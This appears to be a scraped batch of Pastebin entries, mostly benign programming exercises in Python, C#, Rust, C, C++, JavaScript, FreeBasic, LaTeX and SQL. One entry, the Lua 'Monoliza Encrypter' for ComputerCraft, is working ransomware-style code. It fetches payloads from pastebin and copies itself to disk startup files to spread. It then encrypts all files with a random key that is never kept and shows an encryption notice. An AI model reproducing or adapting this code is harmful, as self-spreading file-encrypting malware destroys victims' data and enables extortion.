gWKm1Q6L,Анкета tkinter,plarmi,Python,Thursday 4th of April 2024 01:36:15 PM CDT,"""""""
Создайте анкету с контактными данными клиента.
Имя
Фамилия
Адрес
Телефон
Эл. почта
""""""

import tkinter

def save_file():
    name = name_entry.get()
    surname = surname_entry.get()
    address = address_entry.get()
    phone = phone_entry.get()
    email = email_entry.get()

    with open(""answers.txt"", ""a"", encoding=""utf-8"") as file:
        file.write(""-"" * 15 + ""\n"")
        file.write(f""Имя: {name}\n"")
        file.write(f""Фамилия: {surname}\n"")
        file.write(f""Адрес: {address}\n"")
        file.write(f""Телефон: {phone}\n"")
        file.write(f""Email: {email}\n"")

window = tkinter.Tk()
window.title(""Анкета"")
window.resizable(False, False)

name = tkinter.Label(window, text=""Имя:"")
surname = tkinter.Label(window, text=""Фамилия:"")
address = tkinter.Label(window, text=""Адрес:"")
phone = tkinter.Label(window, text=""Телефон:"")
email = tkinter.Label(window, text=""Email:"")

name_entry = tkinter.Entry(window)
surname_entry = tkinter.Entry(window)
address_entry = tkinter.Entry(window)
phone_entry = tkinter.Entry(window)
email_entry = tkinter.Entry(window)

send = tkinter.Button(window, text=""Отправить"", command=save_file)

name.grid(column=0, row=0, sticky=""w"")
name_entry.grid(column=1, row=0)
surname.grid(column=0, row=1, sticky=""w"")
surname_entry.grid(column=1, row=1)
address.grid(column=0, row=2, sticky=""w"")
address_entry.grid(column=1, row=2)
phone.grid(column=0, row=3, sticky=""w"")
phone_entry.grid(column=1, row=3)
email.grid(column=0, row=4, sticky=""w"")
email_entry.grid(column=1, row=4)

send.grid(row=5, columnspan=2)


window.mainloop()"
kRrnRB60,Largest element of array,SaNik74,C#,Thursday 4th of April 2024 01:23:02 PM CDT,"namespace largestElement
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Random random = new Random();
            int numberOfLines = 10;
            int numberOfColomns = 10;
            int[,] numbers = new int[numberOfLines, numberOfColomns];
            int maxNumber = int.MinValue;
            int replaementElement = 0;

            for (int i = 0; i < numbers.GetLength(0); i++)
            {
                for (int j = 0; j < numbers.GetLength(1); j++)
                {
                    numbers[i, j] = random.Next(int.MinValue, int.MaxValue);
                }
            }

            Console.WriteLine(""Исходная матрица:"");

            for (int i = 0; i < numbers.GetLength(0); i++)
            {
                for (int j = 0; j < numbers.GetLength(1); j++)
                {
                    Console.Write(numbers[i, j] + "" "");
                }

                Console.WriteLine();
            }

            for (int i = 0; i < numbers.GetLength(0); i++)
            {
                for (int j = 0; j < numbers.GetLength(1); j++)
                {
                    if (numbers[i, j] > maxNumber)
                    {
                        maxNumber = numbers[i, j];
                    }
                }
            }

            for (int i = 0; i < numbers.GetLength(0); i++)
            {
                for (int j = 0; j < numbers.GetLength(1); j++)
                {
                    if (numbers[i, j] == maxNumber)
                    {
                        numbers[i, j] = replaementElement;
                    }
                }
            }

            Console.WriteLine();
            Console.WriteLine(""Измененная матрица:"");

            for (int i = 0; i < numbers.GetLength(0); i++)
            {
                for (int j = 0; j < numbers.GetLength(1); j++)
                {
                    Console.Write(numbers[i, j] + "" "");
                }

                Console.WriteLine();
            }

            Console.WriteLine($""\n\nМаксимальное значение массива: {maxNumber}."");
        }
    }
}
"
hfaZYFqg,expr eval,mdgaziur001,Rust,Thursday 4th of April 2024 12:53:01 PM CDT,"use std::f64::consts::PI;
use std::io;
use std::io::Write;
use std::str::Chars;

#[derive(Debug)]
struct Tokenizer<'t> {
    iterator: Chars<'t>,
}

impl<'t> Tokenizer<'t> {
    pub fn new(source: &'t str) -> Self {
        Self {
            iterator: source.chars(),
        }
    }

    pub fn next_token(&mut self) -> Result<Option<Token>, String> {
        let Some(next) = self.iterator.next() else {
            return Ok(None);
        };

        match next {
            '(' => Ok(Some(Token::BrOpen)),
            ')' => Ok(Some(Token::BrClose)),
            '^' => Ok(Some(Token::Op(MathOp::Pow))),
            '+' => Ok(Some(Token::Op(MathOp::Add))),
            '-' => Ok(Some(Token::Op(MathOp::Sub))),
            '*' => Ok(Some(Token::Op(MathOp::Mul))),
            '/' => Ok(Some(Token::Op(MathOp::Div))),
            'π' => Ok(Some(Token::Num(PI))),
            ch if ch.is_ascii_digit() || ch == '.' => {
                let mut num = String::from(ch);
                let mut it2 = self.iterator.clone();

                while let Some(next_ch) = it2.next() {
                    if !next_ch.is_ascii_digit() && next_ch != '.' {
                        break;
                    }

                    num.push(next_ch);
                    self.iterator.next();
                }

                Ok(Some(Token::Num(num.parse().map_err(|e| {
                    format!(""Encountered error while parsing number: {e}"")
                })?)))
            }
            ' ' => self.next_token(),
            _ => Err(""Encountered unexpected character"".to_string()),
        }
    }
}

/// Parser grammar:
///
/// ```
/// expr = term;
/// term = factor ((""+"" | ""-"") factor)*;
/// factor = power ((""*"" | ""/"") power)*;
/// power = unary (""^"" unary)*;
/// unary = ""-""? (unary | primary);
/// primary = Num | ""("" expr "")"";
/// ```
#[derive(Debug)]
struct Parser<'ecx> {
    tokenizer: Tokenizer<'ecx>,
    current: Option<Token>,
}

impl<'ecx> Parser<'ecx> {
    pub fn new(mut tokenizer: Tokenizer<'ecx>) -> Result<Option<Self>, String> {
        let current = tokenizer.next_token()?;

        Ok(Some(Self {
            tokenizer,
            current,
        }))
    }

    pub fn parse(&mut self) -> Result<AST, String> {
        self.term()
    }

    fn term(&mut self) -> Result<AST, String> {
        let mut expr = self.factor()?;

        while self.current == Some(Token::Op(MathOp::Add)) || self.current == Some(Token::Op(MathOp::Sub)) {
            let Token::Op(op) = self.current.unwrap() else {
                unreachable!()
            };

            self.next()?;
            expr = AST::Op(Operation {
                lhs: Box::new(expr),
                rhs: Box::new(self.factor()?),
                op,
            })
        }

        Ok(expr)
    }

    fn factor(&mut self) -> Result<AST, String> {
        let mut expr = self.power()?;

        while self.current == Some(Token::Op(MathOp::Mul)) || self.current == Some(Token::Op(MathOp::Div)) {
            let Token::Op(op) = self.current.unwrap() else {
                unreachable!()
            };

            self.next()?;
            expr = AST::Op(Operation {
                lhs: Box::new(expr),
                rhs: Box::new(self.power()?),
                op,
            })
        }

        Ok(expr)
    }

    fn power(&mut self) -> Result<AST, String> {
        let mut expr = self.unary()?;

        while self.current == Some(Token::Op(MathOp::Pow)) {
            self.next()?;
            expr = AST::Op(Operation {
                lhs: Box::new(expr),
                rhs: Box::new(self.unary()?),
                op: MathOp::Pow,
            })
        }

        Ok(expr)
    }

    fn unary(&mut self) -> Result<AST, String> {
        if matches!(self.current, Some(Token::Op(MathOp::Sub))) {
            let _ = self.next()?;

            let operand = self.unary()?;
            Ok(AST::Neg(Box::new(operand)))
        } else {
            self.primary()
        }
    }

    fn primary(&mut self) -> Result<AST, String> {
        match self.current {
            Some(Token::Num(num)) => {
                self.next()?;
                Ok(AST::Num(num))
            },
            Some(Token::BrOpen) => {
                // Consume ""(""
                let _ = self.next()?;

                // Parse inner expression
                let parsed = self.parse();

                // Consume "")""
                let _ = self.expect(Token::BrClose)?;

                parsed
            }
            Some(_) => Err(""Unexpected token"".to_string()),
            None => Err(""Unexpected EOF"".to_string())
        }
    }

    fn expect(&mut self, expected: Token) -> Result<Token, String> {
        if !matches!(self.current, Some(_expected)) {
            Err(format!(""Expected {expected:?}, found {:?}"", self.current))
        } else {
            Ok(self.current.unwrap())
        }
    }

    fn next(&mut self) -> Result<Option<Token>, String> {
        self.current = self.tokenizer.next_token()?;
        Ok(self.current)
    }
}

#[derive(Debug)]
enum AST {
    Num(f64),
    Op(Operation),
    Neg(Box<AST>),
}

#[derive(Debug)]
struct Operation {
    lhs: Box<AST>,
    rhs: Box<AST>,
    op: MathOp,
}

#[derive(Debug, Copy, Clone, PartialEq)]
enum Token {
    Num(f64),
    BrOpen,
    BrClose,
    Op(MathOp),
}

#[derive(Debug, Copy, Clone, PartialEq)]
enum MathOp {
    Add,
    Sub,
    Mul,
    Div,
    Pow,
}

fn eval_ast(ast: &AST) -> Result<f64, String> {
    match ast {
        AST::Num(num) => Ok(*num),
        AST::Op(operation) => {
            let lhs = eval_ast(&operation.lhs)?;
            let rhs = eval_ast(&operation.rhs)?;

            Ok(match operation.op {
                MathOp::Add => lhs + rhs,
                MathOp::Sub => lhs - rhs,
                MathOp::Mul => lhs * rhs,
                MathOp::Div => lhs / rhs,
                MathOp::Pow => lhs.powf(rhs)
            })
        }
        AST::Neg(expr) => Ok(-eval_ast(expr)?)
    }
}

fn process_expr(expr: &str) {
    let tokenizer = Tokenizer::new(&expr);
    let mut parser = match Parser::new(tokenizer) {
        Ok(Some(parser)) => parser,
        Ok(None) => return,
        Err(e) => {
            eprintln!(""Err: {e}"");
            return;
        }
    };

    let ast = match parser.parse() {
        Ok(ast) => ast,
        Err(e) => {
            eprintln!(""Err: {e}"");
            return;
        }
    };

    match eval_ast(&ast) {
        Ok(res) => println!(""{res}""),
        Err(e) => {
            eprintln!(""Err: {e}"");
            return;
        }
    }
}

fn take_input() -> String {
    print!(""> "");
    io::stdout().flush().unwrap();
    let mut buf = String::new();
    io::stdin().read_line(&mut buf).unwrap();

    buf.trim().to_string()
}

fn main() {
    loop {
        let input = take_input();
        if input == ""q"" {
            break;
        }

        process_expr(&input);
    }
}
"
aRvjUkMC,Monoliza Encrypter,matveymayner,Lua,Thursday 4th of April 2024 12:31:28 PM CDT,"local function getSubPaths(path)
    local list = fs.list(path)
    local paths = {}
 
    for _, name in pairs(list) do
        local newPath = fs.combine(path, name)
        if (fs.isDir(newPath)) then
            local subPaths = getSubPaths(newPath)
            for i = 1, #subPaths do
                paths[#paths+1] = subPaths[i]
            end
        else
            paths[#paths+1] = newPath
        end
    end
 
    return paths
end
 
local function getPaths(path, readROM)
    if (path == """" or path == ""/"") then
        if (readROM) then
            return getSubPaths(path)
        else
            local list = fs.list(""/"")
            local paths = {}
            for _, path in pairs(list) do
                if (path ~= ""rom"") then
                    if (fs.isDir(path)) then
                        local subPaths = getSubPaths(path)
                        for i = 1, #subPaths do
                            paths[#paths+1] = subPaths[i]
                        end
                    else
                        paths[#paths+1] = path
                    end
                end
            end
            return paths
        end
    else
        return getSubPaths(path)
    end
end
 
 
local files = getPaths(""/"", false)
os.setComputerLabel(""Crypt0 PC"")
fs.delete(""virus"")
fs.makeDir(""virus"")
shell.run(""pastebin get EuUDCuRZ virus/vir"")
shell.run(""pastebin get 9YW1XWXN virus/logsalt"")
shell.run(""pastebin get DMx8M0LP virus/aeslua"")
os.loadAPI(""virus/aeslua"")
os.loadAPI(""virus/logsalt"")
 
if fs.exists(""disk"") and fs.isDir(""disk"") then
if fs.exists(""disk/startup"") then
fs.delete(""disk/startup"")
end
fs.copy(""virus/vir"", ""disk/startup"") -- i am evil
end
 
if fs.exists(""disk2"") and fs.isDir(""disk2"") then
if fs.exists(""disk2/startup"") then
fs.delete(""disk2/startup"")
end
fs.copy(""virus/vir"", ""disk2/startup"") -- i am evil v2
end
 
local dec = logsalt.rand(10)
for _,v in pairs(files) do
if string.sub(v, 1,5) == ""virus"" then
    else
print(""Found file "" .. v)
end
end
print(""starting enc"")
local iv = {}
for i = 1,16 do iv[i] = math.random(1,255) end
for _,v in pairs(files) do
    if v == ""virus/aeslua"" or v == ""virus/logsalt"" or v == ""virus/vir"" or v == ""disk/startup"" or v == ""disk2/startup"" then
    else
    local hBf = fs.open(v, ""r"")
    local stuff = hBf.readAll()
    local encrypted = aeslua.encrypt(dec,stuff)
    print(""Encrypted file "" .. v)
    hBf.close()
    hAf = fs.open(v, ""w"")
    hAf.write(encrypted)
    hAf.close()
    end
end
 
term.clear()
term.setBackgroundColor(colors.red)
term.setCursorPos(1,1)
for i=1,16 do
  term.setCursorPos(1,i)
term.write(""-MONOLIZA ENCRYPT-"")
term.write(""Your All Files Has Been Encrypted"")
end
"
B7EcaFtU,finaly_hueta,artmexbet,C,Thursday 4th of April 2024 12:21:48 PM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <pthread.h>
#include <string.h>

#define ROWS 4
#define COLS 5

struct ThreadResult {
    int count;
    int indexes[6];
};

struct ThreadInfo {
    int matrix[ROWS][COLS];
    int deltaX;
    int deltaY;
    int currentIndexI;
    int currentIndexJ;
    struct ThreadResult result;
};

void fill_matrix(int array[ROWS][COLS]) {
    srand(time(NULL));
    for (int i = 0; i < ROWS; i++) {
        for (int j = 0; j < COLS; j++) {
            array[i][j] = 1 + rand() % 3;
        }
    }
}

void print_matrix(int array[ROWS][COLS]) {
    for (int i = 0; i < ROWS; i++) {
        for (int j = 0; j < COLS; j++) {
            printf(""%d "", array[i][j]);
        }
        printf(""\n"");
    }
}

void *get_values(void *info_) {
    struct ThreadInfo *info = (struct ThreadInfo *) info_;
    struct ThreadResult *result = (struct ThreadResult *) malloc(sizeof(struct ThreadResult));
    result->count = 0;
    // Вот отсюда можно выкинуть вычисление уголочка из этой точки в отдельный поток
    int k = 0;
    int lengthOfHorizontal = 0; // Сюда сохраняем длину повторящихся символов в строке
    int i = info->currentIndexI;
    int j = info->currentIndexJ;
    while (0 < j + k && j + k < COLS && info->matrix[i][j + k] == info->matrix[i][j]) {
        lengthOfHorizontal++;
        // Или вот отсюда можно запускать потоки, проверяющие вертикальные линии на совпадение с элементом matrix[i][j]
        // Нижний цикл выкинуть в отдельный поток
        int l = 0;
        int lengthOfVertical = 0; // Сюда сохраняем длину повторяющихся символов в столбце
        while (0 < i + l && i + l < ROWS && info->matrix[i + l][j + k] == info->matrix[i][j + k]) {
            lengthOfVertical++;
            l += info->deltaX;
        }
        if (lengthOfHorizontal + lengthOfVertical > result->count) {
            result->indexes[0] = i;
            result->indexes[1] = j;
            result->indexes[2] = i;
            result->indexes[3] = j + k;
            result->indexes[4] = i + l - 1 * info->deltaX;
            result->indexes[5] = j + k;
            result->count = lengthOfHorizontal + lengthOfVertical;
//                    coords = {i, j, i, j + k, i + l - 1, j + k};
        }
        k += info->deltaY;
    }
    return (void *) result;
}

void find_g(int matrix[ROWS][COLS]) {
    int maxCount = 0;
    int coords[] = {0, 0, 0, 0, 0, 0};
    for (int i = 0; i < ROWS; i++) {
        for (int j = 0; j < COLS; j++) {
            struct ThreadInfo first, second, third, fourth;
            struct ThreadResult *result1, *result2, *result3, *result4;
            memcpy(first.matrix, matrix, ROWS * COLS * sizeof(int));
            memcpy(second.matrix, matrix, ROWS * COLS * sizeof(int));
            memcpy(third.matrix, matrix, ROWS * COLS * sizeof(int));
            memcpy(fourth.matrix, matrix, ROWS * COLS * sizeof(int));
            first.deltaX = 1;
            first.deltaY = -1;
            first.currentIndexI = i;
            first.currentIndexJ = j;

            second.deltaX = -1;
            second.deltaY = -1;
            second.currentIndexI = i;
            second.currentIndexJ = j;

            third.deltaX = -1;
            third.deltaY = 1;
            third.currentIndexI = i;
            third.currentIndexJ = j;

            fourth.deltaX = 1;
            fourth.deltaY = 1;
            fourth.currentIndexI = i;
            fourth.currentIndexJ = j;

            pthread_t thread1, thread2, thread3, thread4;
            pthread_create(&thread1, NULL, &get_values, &first);
            pthread_create(&thread2, NULL, &get_values, &second);
            pthread_create(&thread3, NULL, &get_values, &third);
            pthread_create(&thread4, NULL, &get_values, &fourth);
            pthread_join(thread1, (void **) &result1);
            pthread_join(thread2, (void **) &result2);
            pthread_join(thread3, (void **) &result3);
            pthread_join(thread4, (void **) &result4);
//            for (int i = 0; i < 6; i++) {
//                printf(""%d "", first.result.indexes[i]);
//            }
//            printf(""\n"");
            if (result1->count > maxCount) {
                maxCount = result1->count;
                memcpy(coords, result1->indexes, sizeof(result1->indexes));
            }
            if (result2->count > maxCount) {
                maxCount = result2->count;
                memcpy(coords, result2->indexes, sizeof(result2->indexes));
            }
            if (result3->count > maxCount) {
                maxCount = result3->count;
                memcpy(coords, result3->indexes, sizeof(result3->indexes));
            }
            if (result4->count > maxCount) {
                maxCount = result4->count;
                memcpy(coords, result4->indexes, sizeof(result4->indexes));
            }
        }
    }
    for (int i = 0; i < 6; i++) {
        printf(""%d "", coords[i]);
    }
}

int main() {
//    printf(""Hello, World!\n"");
    int arr[ROWS][COLS] = {{0, 2, 0, 2, 0},
                           {0, 1, 1, 1, 0},
                           {2, 0, 2, 1, 1},
                           {0, 2, 0, 1, 1}};
//    fill_matrix(arr);
    print_matrix(arr);
    find_g(arr);
    return 0;
}
"
6n6QvRPT,Untitled,Mysoft,FreeBasic,Thursday 4th of April 2024 12:16:54 PM CDT,"#include ""fbgfx.bi""

const ScreenWid=640,ScreenHei=480 

screenres ScreenWid,ScreenHei,8  'setup 640x480x8bpp (256 colors)
width ScreenWid\8,ScreenHei\16   'set font size to 8x16

'iDirX is how many pixels it moves per frame (initially 1 (to the right))
'since we're going from -10 to 10... that number must be a divisor of 10
'so must be one of 1,2,5 or 10 (this simplify the check)
dim as integer iOffsetX,iDirX=1
dim as integer iPosX,iPosY
dim as string sSentence = ""Hello World""

'calculate center position for sentence
iPosX = (ScreenWid-len(sSentence)*8)\2 'horizontal
iPosY = (ScreenHei-16)\2      'vertical

do
  
  screenlock 'block screen from update
    cls 'clears whole screen (could fill just an area)
    'draw centered text over right position (in yellow)
    Draw String ( iPosX+iOffsetX , iPosY ) , sSentence , 14
    
    iOffsetX += iDirX 'change position depending on direction (left/right)
    if iOffsetX = -10 orelse iOffsetX = 10 then 
      iDirX = -iDirX 'if it hit side positions invert direction
    end if
  screenunlock 'allow display of the screen
  sleep 30 'waits 30ms... making roughly 30fps
  
  'draw frames until ESC is pressed
loop until multikey(fb.SC_ESCAPE)"
BVCYikLA,Untitled,poxipox,Lua,Thursday 4th of April 2024 12:03:51 PM CDT,"glbMissionCfg.setMission(cid, playerMission)

NA:

		if missionTab.talk_start_addNextMission then
			glbMissionCfg.setMission(cid, playerMission+1)
		else
			glbMissionCfg.setMission(cid, playerMission)
		end
"
XhDpAjmZ,Noam Oved | HW Networks,XNoAmX,Python,Thursday 4th of April 2024 11:47:08 AM CDT,"import requests
from lxml import html

LETTER_OFFSET = 100

def scrape_files():
    """"""
    Scrape files from a specific URL and return a list of file names.
    :return: A list of file names
    :rtype: list
    """"""
    URL = ""http://webisfun.cyber.org.il/nahman/files/""
    response = requests.get(URL)
    tree = html.fromstring(response.content)
    trs = tree.xpath('//a')

    file_list = []

    for tr in trs:
        file_list.append(tr.attrib.get('href'))
    return file_list[5:]

def extract_password_from_site():
    """"""    
    Extract a password from files obtained from a website.
    :return: Extracted password
    :rtype: str
    """"""
    URL = ""http://webisfun.cyber.org.il/nahman/files/{file}""
    password = """"
    for i in scrape_files():
        response = requests.get(URL.format(file = str(i)))
        password += response.content.decode('utf-8')[LETTER_OFFSET - 1]
    return password

def find_most_common_words(URL, words_in_sentence):
    """"""
    Fetches text from the provided URL, counts the frequency of each word, 
    and returns a string containing the most common words up to the specified count.
    :param URL: The URL from which to fetch the text
    :param words_in_sentence: Number of most common words to include in the output sentence
    :type URL: str
    :type words_in_sentence: int
    :return: A string containing the most common words
    :rtype: str
    """"""
    response = requests.get(URL)
    response = response.content.decode('utf-8')
    wordlist = response.split("" "")
    freq_dict = {}

    for element in wordlist:  
        if element in freq_dict:
            freq_dict[element] += 1  
        else:  
            freq_dict[element] = 1
              
    freq_dict = dict(sorted(freq_dict.items(), key=lambda item: item[1], reverse=True))  

    return "" "".join(list(freq_dict.keys())[:words_in_sentence])

def main():
    print(""[!] Welcome to nahman cracker"")
    print(""[1] Get password"")
    print(""[2] Get sentence "")
    option = input(""[+] "")
    
    if option == '1':
        print(extract_password_from_site())
    elif option == '2':
        print(find_most_common_words(""http://webisfun.cyber.org.il/nahman/final_phase/words.txt"", 6))

if __name__ == '__main__':
    main()

"
3LXG7BEL,Untitled,Mysoft,FreeBasic,Thursday 4th of April 2024 11:42:49 AM CDT,"const Yellow=14,Red=12
var iCor = Yellow
do
  color iCor : iCor xor= (Yellow xor Red)
  locate 1,1 : print ""Price: $3232"";
  sleep 200
loop
  "
HtqgyDDg,calculator,SergioG_0823849,JavaScript,Thursday 4th of April 2024 11:34:07 AM CDT,"class Calculator {
  constructor() {
    this.result = 0;
  }

  add(num) {
    this.result += num;
    return this;
  }

  subtract(num) {
    this.result -= num;
    return this;
  }

  multiply(num) {
    this.result *= num;
    return this;
  }

  divide(num) {
    if (num === 0) {
      throw new Error(""Cannot divide by zero"");
    }
    this.result /= num;
    return this;
  }

  getResult() {
    return this.result;
  }
}

// Test method chaining
const calc = new Calculator();
const result = calc.add(5).multiply(2).subtract(3).divide(2).getResult();
console.log(result); // Output: 4
"
tAsB0Qzu,factory,SergioG_0823849,JavaScript,Thursday 4th of April 2024 11:29:15 AM CDT,"// define facory as a meta-class

class Employee {
  create (type) {
    let employee
    if (type === 'fulltime') {
      employee = new FullTime()
    } else if (type === 'parttime') {
      employee = new PartTime()
    } else if (type === 'temporary') {
      employee = new Temporary()
    } else if (type === 'contractor') {
      employee = new Contractor()
    }
    employee.type = type
    employee.say = function () {
      console.log(`${this.type}: rate ${this.rate}/hour`)
    }
  }
}

// define classes for every job type
class Fulltime {
  constructor () {
    this.rate = '$12'
  }
}

class PartTime {
  constructor () {
    this.rate = '$11'
  }
}

class Temporary {
  constructor () {
    this.rate = '$10'
  }
}

class Contractor {
  constructor () {
    this.rate = '$15'
  }
}

// usage example
// create new factory
const factory = new Employee()
fulltime = factory.create('fulltime')
parttime = factory.create('parttime')
temporary = factory.create('temporary')
contractor = factory.create('contractor')

// use it
fulltime.say()
parttime.say()
temporary.say()
contractor.say()"
3m17VwDa,car inheritance,SergioG_0823849,JavaScript,Thursday 4th of April 2024 11:23:07 AM CDT,"// Constructor function for base Vehicle
function Vehicle(make, model) {
  this.make = make;
  this.model = model;
}

// Method for starting the vehicle
Vehicle.prototype.start = function() {
  console.log(`Starting the ${this.make} ${this.model}`);
};

// Constructor function for Car inheriting from Vehicle
function Car(make, model, numDoors) {
  // Call the parent constructor using call() or apply()
  Vehicle.call(this, make, model);
  this.numDoors = numDoors;
}

// Inherit Vehicle prototype methods
Car.prototype = Object.create(Vehicle.prototype);
Car.prototype.constructor = Car;

// Override start method for Car
Car.prototype.start = function() {
  console.log(`Starting the ${this.make} ${this.model} with ${this.numDoors} doors`);
};

// Test the classes
const myVehicle = new Vehicle('Toyota', 'Camry');
myVehicle.start(); // Output: Starting the Toyota Camry

const myCar = new Car('Honda', 'Civic', 4);
myCar.start(); // Output: Starting the Honda Civic with 4 doors"
bsREf055,dog,SergioG_0823849,JavaScript,Thursday 4th of April 2024 11:21:43 AM CDT,"// 1) Create a class Animal with properties name and a method makeSound()
class Animal {
  constructor(name) {
    this.name = name;
  }

  makeSound() {
    console.log(""The animal makes a sound"");
  }
}

// 2) Create a class Dog that inherits from Animal and overrides the makeSound() method
class Dog extends Animal {
  constructor(name) {
    super(name);
  }

  makeSound() {
    console.log(`${this.name} barks`);
  }
}

// 3) Instantiate a Dog object and call its makeSound() method
const myDog = new Dog(""Buddy"");
myDog.makeSound(); // Output: Buddy barks"
E8K29FWV,Untitled,MeehoweCK,C++,Thursday 4th of April 2024 11:21:27 AM CDT,"#include <iostream>
#include <ctime>
#include <cstdlib>

using namespace std;

int main() {
	const auto W{ 7 };
	const auto K{ 11 };
	int tablica[W][K];		// stworzenie tablicy dwuwymiarowej o wymiarach WxK

	srand(time(nullptr));
	// wypełnienie tablicy:
	auto parzyste{ 0 };
	for (auto i{ 0 }; i < W; ++i) {
		for (auto j{ 0 }; j < K; ++j) {
			tablica[i][j] = 1 + rand() % 30;
			cout << tablica[i][j] << '\t';
			if (tablica[i][j] % 2 == 0) {
				++parzyste;
			}
		}
		cout << endl;
	}
	cout << ""W tablicy znajduje sie "" << parzyste << "" parzystych liczb.\n"";

	return 0;
}"
WqDxDzJ6,Untitled,SergioG_0823849,JavaScript,Thursday 4th of April 2024 11:20:36 AM CDT,"// Define the Engine object
const Engine = {
  horsepower: 250,
  fuelType: 'gasoline'
};

// Define the Vehicle object
const Vehicle = {
  make: 'Jeep',
  model: 'Cherokee'
};

// Create a Car object by composing Vehicle and Engine objects using Object.assign()
const Car = Object.assign({}, Vehicle, Engine);

// Test Car object
console.log(Car);"
3Xq94ktT,Untitled,MeehoweCK,C++,Thursday 4th of April 2024 11:18:59 AM CDT,"#include <iostream>
#include <ctime>
#include <cstdlib>

using namespace std;

int main() {
	const auto W{ 5 };
	const auto K{ 6 };
	int tablica[W][K];		// stworzenie tablicy dwuwymiarowej o wymiarach WxK

	srand(time(nullptr));
	// wypełnienie tablicy:
	for (auto i{ 0 }; i < W; ++i) {
		for (auto j{ 0 }; j < K; ++j) {
			tablica[i][j] = 1 + rand() % 30;
		}
	}

	// wypisanie tablicy na ekran:
	for (auto i{ 0 }; i < W; ++i) {
		for (auto j{ 0 }; j < K; ++j) {
			cout << tablica[i][j] << '\t';
		}
		cout << endl;
	}

	auto parzyste{ 0 };
	// sprawdzenie ile jest liczb parzystych w tablicy:
	for (auto i{ 0 }; i < W; ++i) {
		for (auto j{ 0 }; j < K; ++j) {
			if (tablica[i][j] % 2 == 0) {
				++parzyste;
			}
		}
	}
	cout << ""W tablicy znajduje sie "" << parzyste << "" parzystych liczb.\n"";

	return 0;
}"
4e8TkAEu,Untitled,SergioG_0823849,JavaScript,Thursday 4th of April 2024 11:17:38 AM CDT,"// Prototype object for math operations
const MathOperations = {
  // Method to add two numbers
  add(x, y) {
    return x + y;
  },

  // Method to subtract two numbers
  subtract(x, y) {
    return x - y;
  }
};

// Specific object representing a number value
const NumberValue = {
  value: 0
};

// Delegate math operations to the MathOperations prototype methods
NumberValue.__proto__ = MathOperations;

// Test math operations
const number1 = Object.create(NumberValue);
number1.value = 10;

const number2 = Object.create(NumberValue);
number2.value = 5;

console.log(number1.add(5, 3)); // Output: 8
console.log(number2.subtract(10, 3)); // Output: 7"
eXDtYy3s,Normal Gauss Distribution,nm9505,Latex,Thursday 4th of April 2024 11:11:51 AM CDT,"\documentclass{article}[14pt,a4paper] % Comment the following line to NOT allow the usage of umlauts 
%\usepackage[utf8]{inputenc}
%\useusepackage[utf8]{imputenc} %\usepackage[a4paper, lmargin=2cm, rmargin=2cm, bottom=2cm]{geometry}
\usepackage{color} % Uncomment the following line to allow the usage of graphics (.png, .jpg) 
\usepackage{multicol} \usepackage{verbatim} \usepackage{graphicx} \usepackage{amsmath} \usepackage[all]{xy} \usepackage{pst-all} \usepackage{tikz} \usepackage{gnuplottex}  \usepackage{pst-pdf} 
\usepackage{mathtools,amssymb}
\usepackage{xcolor}
%\usepackage{chronology}
%\usepackage{pst-solides3d} 
\tikzset{flippedeventlabel/.append style={align=center}} \usetikzlibrary{datavisualization} \usetikzlibrary{matrix.skeleton} \usetikzlibrary[shapes,arrows,positioning,fit,backgrounds,intersections,shadows,calc] \usetikzlibrary{positioning} \usetikzlibrary{decorations.text} \usetikzlibrary{decorations.pathmorphing} 
\usepackage{pgfplots} \pgfplotsset{width=10cm,compat=1.9} 
%\psset{viewpoint=10 18 60 rtp2xyz,Decran=10,fontsize=10,unit=0.65cm} 
\usetikzlibrary{patterns} 
\pgfmathdeclarefunction{gauss}{2}{\pgfmathparse{1/(#2*sqrt(2*pi))*exp(-((x-#1)^2)/(2*#2^2))} }
% Start the document
\begin{document} 
\begin{center} 



\begin{tikzpicture}
\begin{pgfonlayer}{background} \path[fill=black,rounded corners]
(-1,-1) rectangle (10,5);
\end{pgfonlayer} 


 
\begin{axis}[white,no markers, domain=0:10, samples=100, axis lines*=left, xlabel=Normal, ylabel=axis $y$, height=5cm, width=10cm, xticklabels={0, $-\infty$, -z, -z/2, 0, z/2, z, $+\infty$, 0}, ytick=\empty, enlargelimits=false, clip=false, axis on top] 
\addplot [very thick, green, domain=-3:3] {gauss(0,1)} \closedcycle;  

\end{axis}
\draw node at (4,1){\large\textcolor{white}{$f(z) = \frac{1}{\sqrt{2\pi}}\ \mathbf{e}^{(\frac{z-\mu}{\sigma})^2}$}};
\end{tikzpicture} 
\end{center} 
%Uncomment the following two lines if you want to have a bibliography1 %\bibliographystyle{alpha} %\bibliography{document} %\begin{thebibliography}{document} %\renewcommand %\refname{BIBLIOGRAFIA} %\bibitem{Baz} \textit{Bazaraa, M.S., J.J. %Jarvis} y \textit{H.D. Sheraly}, %\textit{ProgramaciÃ³n lineal y flujo de redes}, %Segunda EdiciÃ³n. LimusÃ¡, MÃ©xico, DF. 2004. %\end{thebibliography} 
\end{document}
"
e0bbEpCP,Untitled,MeehoweCK,C++,Thursday 4th of April 2024 10:48:27 AM CDT,"#include <iostream>
#include <ctime>
#include <cstdlib>

using namespace std;

int main() {
	const auto W{ 5 };
	const auto K{ 6 };
	int tablica[W][K];		// stworzenie tablicy dwuwymiarowej o wymiarach WxK

	srand(time(nullptr));
	// wypełnienie tablicy:
	for (auto i{ 0 }; i < W; ++i) {
		for (auto j{ 0 }; j < K; ++j) {
			tablica[i][j] = 1 + rand() % 30;
		}
	}

	return 0;
}"
rCJBekWJ,Pandey20,wkblack,SQL,Thursday 4th of April 2024 10:34:21 AM CDT,"SELECT
  s.z, s.ra, s.dec,
  p.petroMag_r AS pMag_r, p.extinction_r, p2.KcorrR, em.ebmv, 
  (p.petroMag_u - p.petroMag_r) - (p.extinction_u - p.extinction_r) AS ur_color,
  (p.petroMag_g - p.petroMag_r) - (p.extinction_g - p.extinction_r) AS gr_color,
  sm.logMass AS lmass, sm.ssfr
FROM 
  specobj AS s
  JOIN photoobj AS p ON s.specobjID = p.specobjID
  JOIN photoz AS p2 ON p.objID = p2.objID
  JOIN stellarMassFSPSGranWideDust AS sm ON s.specobjID = sm.specobjID
  JOIN emissionLinesPort AS em ON s.specobjID = em.specobjID
WHERE
  s.class = 'galaxy'
  AND s.zwarning = 0
  AND s.z BETWEEN 0 AND 0.3
  AND s.ra BETWEEN 125 AND 235
  AND s.dec BETWEEN 0 AND 60
  AND sm.ssfr != -9999
  AND sm.logMass != -9999"
